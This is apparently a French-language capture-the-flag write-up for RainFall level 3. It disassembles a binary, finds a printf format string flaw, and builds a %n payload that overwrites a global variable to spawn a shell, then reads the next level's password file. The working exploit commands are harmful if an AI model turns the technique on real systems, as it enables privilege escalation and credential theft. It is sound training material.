# Level 3

```bash
(gdb) disas main 
Dump of assembler code for function main:
   0x0804851a <+0>:	push   ebp
   0x0804851b <+1>:	mov    ebp,esp
   0x0804851d <+3>:	and    esp,0xfffffff0
   0x08048520 <+6>:	call   0x80484a4 <v>
   0x08048525 <+11>:	leave  
   0x08048526 <+12>:	ret    
End of assembler dump.
(gdb) disas v
Dump of assembler code for function v:
   0x080484a4 <+0>:	push   ebp
   0x080484a5 <+1>:	mov    ebp,esp
   0x080484a7 <+3>:	sub    esp,0x218
   0x080484ad <+9>:	mov    eax,ds:0x8049860
   0x080484b2 <+14>:	mov    DWORD PTR [esp+0x8],eax
   0x080484b6 <+18>:	mov    DWORD PTR [esp+0x4],0x200
   0x080484be <+26>:	lea    eax,[ebp-0x208]
   0x080484c4 <+32>:	mov    DWORD PTR [esp],eax
   0x080484c7 <+35>:	call   0x80483a0 <fgets@plt>
   0x080484cc <+40>:	lea    eax,[ebp-0x208]
   0x080484d2 <+46>:	mov    DWORD PTR [esp],eax
   0x080484d5 <+49>:	call   0x8048390 <printf@plt>
   0x080484da <+54>:	mov    eax,ds:0x804988c
   0x080484df <+59>:	cmp    eax,0x40
   0x080484e2 <+62>:	jne    0x8048518 <v+116>
   0x080484e4 <+64>:	mov    eax,ds:0x8049880
   0x080484e9 <+69>:	mov    edx,eax
   0x080484eb <+71>:	mov    eax,0x8048600
   0x080484f0 <+76>:	mov    DWORD PTR [esp+0xc],edx
   0x080484f4 <+80>:	mov    DWORD PTR [esp+0x8],0xc
   0x080484fc <+88>:	mov    DWORD PTR [esp+0x4],0x1
   0x08048504 <+96>:	mov    DWORD PTR [esp],eax
   0x08048507 <+99>:	call   0x80483b0 <fwrite@plt>
   0x0804850c <+104>:	mov    DWORD PTR [esp],0x804860d
   0x08048513 <+111>:	call   0x80483c0 <system@plt>
   0x08048518 <+116>:	leave  
   0x08048519 <+117>:	ret    
End of assembler dump.
(gdb) 
```

Comme nous pouvons le voir une fois l'executable desassembler que cette fois ci un buffer overflow ne peut pas ce faire comme les niveaux precedentes vu l'utilisation de `fgets` et la representation approximative de la fonction `v` sous ghidra nous montre une utilisation suspicieuse de `printf` ou le buffer est passer directement en parametre sans utilisation de specifier

C'est donc une format string vulnerability dans le contexte de ce niveau `system` sera appeler si la condition ci dessus est valide
```asm
mov    eax,ds:0x804988c
cmp    eax,0x40
```

Ici `0x804988c` etant une variable int globale
```bash
level3@RainFall:~$ objdump -t level3 

level3:     file format elf32-i386

SYMBOL TABLE:
....
0804988c g     O .bss	00000004              m
....
```

Notre but est donc d'acceder grace a `printf` a la stack et d'ecrire 64 (0x40 en hexa) dans `m` avec le specifier `%n` (voir man 3 printf -> BUGS)

Cherchons d'abord l'adresse de notre buffer en printant autant de `%x` dont on a besoin

```bash
level3@RainFall:~$ ./level3 <<< $(python -c 'print "AAAA" + "%x " * 50')
AAAA200 b7fd1ac0 b7ff37d0 41414141 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 b7000a78 1 b7fdcb18 b7fe7cac 0 0 0 0 0
```
Maintenant nous devons remplacer notre buffer de test par l'adresse de la variable `m` et trouver le padding restant a copier dans le buffer pour atteindre 64 caracteres.

Notre payload sera donc composer de :
		
	1- L'adresse qu'on souhaite modifier qui ecrit 4 octets
	2- 3 %x specifiers pour atteindre l'adresse de notre buffer qui vont ecrire 19 octets
	3- Autant de caractere dont on a besoin pour atteindre la valeur 64
	4- Le specifier %n pour ecrire la valeur 64 a notre adresse donner en parametre

```bash
level3@RainFall:~$ ./level3 <<< $(python -c 'print "\x8c\x98\x04\x08" + "%x" * 3')
�200b7fd1ac0b7ff37d0

level3@RainFall:~$ bc -q
64 - (2*8 + 3 + 4)
41

level3@RainFall:~$ (python -c 'print "\x8c\x98\x04\x08" + "%x" * 3 + "A" * 41 + "%n"'; cat) | ./level3
�200b7fd1ac0b7ff37d0AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Wait what?!
whoami
level4
cat /home/user/level4/.pass
************************************
```